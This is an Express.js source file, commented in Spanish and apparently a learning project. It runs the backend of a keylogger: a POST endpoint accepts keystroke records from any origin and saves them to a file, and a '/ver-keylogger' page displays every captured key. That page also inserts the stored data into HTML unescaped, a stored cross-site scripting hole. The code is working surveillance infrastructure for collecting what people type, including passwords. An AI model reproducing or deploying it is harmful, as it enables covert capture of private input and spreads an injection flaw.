// ============================================
// SERVIDOR EXPRESS - BACKEND DE PRUEBA
// ============================================
// Este es un servidor web construido con Express.js (framework de Node.js)
// que expone varios endpoints REST para capturar y visualizar datos

// 1. IMPORTAR MÓDULOS NECESARIOS
// --------------------------------------------
const express = require('express');      // Framework web para crear el servidor y rutas
const fs = require('fs').promises;      // Sistema de archivos (versión con Promises para async/await)
const path = require('path');           // Utilidad para trabajar con rutas de archivos

// 2. CREAR LA APLICACIÓN EXPRESS
// --------------------------------------------
const app = express();                  // Crea una instancia de la aplicación Express
const PORT = process.env.PORT || 3000;  // Puerto en el que escuchará el servidor
                                        // process.env.PORT lo proporciona Render en producción
                                        // Si no existe, usa el puerto 3000 por defecto

// 3. LOGS INICIALES
// --------------------------------------------
// Estos console.log ayudan a diagnosticar el estado del servidor al iniciarse
console.log('🚀 INICIANDO SERVIDOR BACKEND-PRUEBA');
console.log('🌍 Entorno:', process.env.NODE_ENV || 'development');
console.log('📦 Puerto:', PORT);

// 4. CONFIGURAR MIDDLEWARE
// --------------------------------------------
// Los middleware son funciones que procesan las peticiones ANTES de llegar a las rutas

// 4.1 Middleware para parsear JSON
// Convierte el body de las peticiones POST en un objeto JavaScript accesible via req.body
app.use(express.json());

// 4.2 Middleware de CORS (Cross-Origin Resource Sharing)
// Permite que el frontend (en Netlify) pueda hacer peticiones al backend (en Render)
// Sin esto, el navegador bloquearía las peticiones por razones de seguridad
app.use((req, res, next) => {
  // Permite peticiones desde cualquier origen ('*')
  res.header('Access-Control-Allow-Origin', '*');
  // Métodos HTTP permitidos
  // Nota: PUT y DELETE están incluidos para extensibilidad futura,
  // pero actualmente el servidor solo implementa GET y POST
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  // Headers que el cliente puede enviar
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  // Continúa con la siguiente función en la cadena
  next();
});

// 5. DEFINIR RUTAS (ENDPOINTS)
// --------------------------------------------

// ========================================
// ENDPOINT 1: GET / - Información del servidor
// ========================================
// Propósito: Proporcionar información básica sobre el servidor
// Método: GET (para obtener información)
// URL: https://backend-prueba-o523.onrender.com/
app.get('/', (req, res) => {
  // req = request (petición que llega del cliente)
  // res = response (respuesta que enviamos al cliente)
  
  // res.json() envía una respuesta en formato JSON
  res.json({
    message: '✅ Backend funcionando correctamente',
    timestamp: new Date().toISOString(),  // Hora actual en formato ISO
    server: 'backend-prueba',
    version: '2.0.0',
    endpoints: [
      'GET /',
      'GET /health',
      'GET /ver-keylogger',
      'POST /captura'
    ]
  });
});

// ========================================
// ENDPOINT 2: GET /health - Estado del servidor
// ========================================
// Propósito: Endpoint de monitoreo para verificar la salud del servidor
// Método: GET
// URL: https://backend-prueba-o523.onrender.com/health
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    uptime: process.uptime(),              // Segundos que lleva corriendo el servidor
    timestamp: new Date().toISOString(),
    memory: process.memoryUsage(),         // Uso de memoria del proceso
    env: process.env.NODE_ENV || 'development'
  });
});

// ========================================
// ENDPOINT 3: POST /captura - Capturar y guardar datos
// ========================================
// Propósito: Recibir datos del frontend y guardarlos en un archivo
// Método: POST (para enviar/crear datos)
// URL: https://backend-prueba-o523.onrender.com/captura
// Body: JSON con los datos a capturar
app.post('/captura', async (req, res) => {
  // async/await permite trabajar con operaciones asíncronas de forma más limpia
  
  try {
    // PASO 1: Registrar en consola los datos recibidos
    console.log('📥 Datos recibidos:', req.body);
    // req.body contiene los datos enviados por el cliente en formato JSON
    // Ejemplo: { key: 'a', code: 'KeyA', time: '2025-12-09...' }
    
    // PASO 2: Preparar los datos para guardar
    // Agregamos información adicional (timestamp, servidor)
    // y convertimos todo a formato JSON string con salto de línea
    const data = JSON.stringify({
      ...req.body,                         // Spread operator: incluye todos los datos del cliente
      timestamp: new Date().toISOString(), // Agrega timestamp del servidor
      server: 'render'                     // Agrega identificador del servidor
    }) + '\n';  // Agrega salto de línea para separar registros
    
    // PASO 3: Guardar en archivo
    // fs.appendFile agrega datos al final del archivo sin borrar lo anterior
    // Si el archivo no existe, lo crea automáticamente
    await fs.appendFile('./datos.txt', data);
    
    // PASO 4: Confirmar éxito en logs
    console.log('✅ Datos guardados correctamente');
    
    // PASO 5: Responder al cliente con éxito
    res.json({ 
      ok: true, 
      message: 'Datos guardados correctamente',
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    // Si algo sale mal, capturamos el error
    console.error('❌ Error al guardar datos:', error);
    
    // Respondemos con código 500 (Internal Server Error)
    res.status(500).json({ 
      error: 'Error interno del servidor',
      message: error.message 
    });
  }
});

// ========================================
// ENDPOINT 4: GET /ver-keylogger - Visualizar datos capturados
// ========================================
// Propósito: Mostrar en una página HTML todos los datos guardados
// Método: GET
// URL: https://backend-prueba-o523.onrender.com/ver-keylogger
app.get('/ver-keylogger', async (req, res) => {
  try {
    console.log('📖 Solicitando datos capturados');
    
    // PASO 1: Leer el contenido del archivo datos.txt
    const data = await fs.readFile('./datos.txt', 'utf8');
    // 'utf8' especifica la codificación del archivo (texto plano)
    
    // PASO 2: Generar y enviar una página HTML con los datos
    // res.send() envía HTML en lugar de JSON
    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>Datos Capturados - Backend Prueba</title>
        <style>
          /* Estilos CSS para hacer la página más agradable */
          body { 
            font-family: Arial, sans-serif; 
            max-width: 1200px; 
            margin: 0 auto; 
            padding: 20px; 
            background-color: #f5f5f5;
          }
          .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          pre { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 5px; 
            overflow-x: auto;
            border-left: 4px solid #007bff;
          }
          .header {
            color: #007bff;
            border-bottom: 2px solid #007bff;
            padding-bottom: 10px;
            margin-bottom: 20px;
          }
          .back-btn {
            display: inline-block;
            background: #007bff;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
          }
          .back-btn:hover {
            background: #0056b3;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🎹 Datos Capturados del Keylogger</h1>
            <p>Servidor: <strong>Render</strong> | Actualizado: ${new Date().toLocaleString()}</p>
          </div>
          <!-- Mostramos los datos dentro de un tag <pre> para mantener el formato -->
          <pre>${data}</pre>
          <a href="https://papadelta2.netlify.app/" class="back-btn">🏠 Volver al Frontend</a>
        </div>
      </body>
      </html>
    `);
    
  } catch (error) {
    // Si el archivo no existe (error ENOENT = Error NO ENTry)
    if (error.code === 'ENOENT') {
      console.log('📝 No hay datos aún, mostrando mensaje por defecto');
      
      // Mostrar página HTML indicando que no hay datos
      res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
          <meta charset="UTF-8">
          <title>Sin Datos - Backend Prueba</title>
          <style>
            body { 
              font-family: Arial, sans-serif; 
              max-width: 800px; 
              margin: 0 auto; 
              padding: 20px; 
              text-align: center;
              background-color: #f5f5f5;
            }
            .container {
              background: white;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .emoji { font-size: 4em; margin-bottom: 20px; }
            .back-btn {
              display: inline-block;
              background: #007bff;
              color: white;
              padding: 12px 24px;
              text-decoration: none;
              border-radius: 5px;
              margin: 10px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="emoji">📭</div>
            <h1>No hay datos capturados aún</h1>
            <p>Utiliza el keylogger para capturar algunas teclas primero.</p>
            <a href="https://papadelta2.netlify.app/" class="back-btn">🏠 Ir al Frontend</a>
            <a href="https://papadelta2.netlify.app/keylogger.html" class="back-btn">🎹 Ir al Keylogger</a>
          </div>
        </body>
        </html>
      `);
    } else {
      // Si es otro tipo de error
      console.error('❌ Error al leer datos:', error);
      res.status(500).send(`
        <h1>Error del servidor</h1>
        <p>Error al leer los datos: ${error.message}</p>
        <a href="https://papadelta2.netlify.app/">Volver al inicio</a>
      `);
    }
  }
});

// ========================================
// MANEJO DE RUTAS NO ENCONTRADAS (404)
// ========================================
// Este middleware captura todas las rutas que no coincidan con ningún endpoint definido
// El asterisco '*' significa "cualquier ruta"
app.use('*', (req, res) => {
  res.status(404).json({
    error: 'Ruta no encontrada',
    path: req.originalUrl,              // Muestra qué ruta intentó acceder el cliente
    availableEndpoints: ['/', '/health', '/ver-keylogger', '/captura']
  });
});

// ========================================
// INICIAR EL SERVIDOR
// ========================================
// app.listen() inicia el servidor HTTP
// Parámetros:
//   - PORT: Puerto en el que escuchar (ej: 3000)
//   - '0.0.0.0': Escuchar en todas las interfaces de red (necesario para Render)
//   - callback: Función que se ejecuta cuando el servidor está listo
app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 ================================');
  console.log(`✅ SERVIDOR INICIADO CORRECTAMENTE`);
  console.log(`🌐 Puerto: ${PORT}`);
  console.log(`🕐 Hora: ${new Date().toISOString()}`);
  console.log(`🔗 Endpoints activos:`);
  console.log(`   GET  / (info del servidor)`);
  console.log(`   GET  /health (diagnóstico)`);
  console.log(`   GET  /ver-keylogger (datos)`);
  console.log(`   POST /captura (recibir datos)`);
  console.log('🚀 ================================');
});

// ========================================
// RESUMEN DE CÓMO FUNCIONA TODO
// ========================================
// 1. Se importan los módulos necesarios (express, fs, path)
// 2. Se crea la aplicación Express
// 3. Se configuran middlewares (JSON parser, CORS)
// 4. Se definen las rutas/endpoints (GET /, GET /health, POST /captura, GET /ver-keylogger)
// 5. Se maneja el caso 404 para rutas no encontradas
// 6. Se inicia el servidor en el puerto especificado
//
// FLUJO DE UNA PETICIÓN:
// Cliente → Middleware CORS → Middleware JSON → Ruta específica → Respuesta al cliente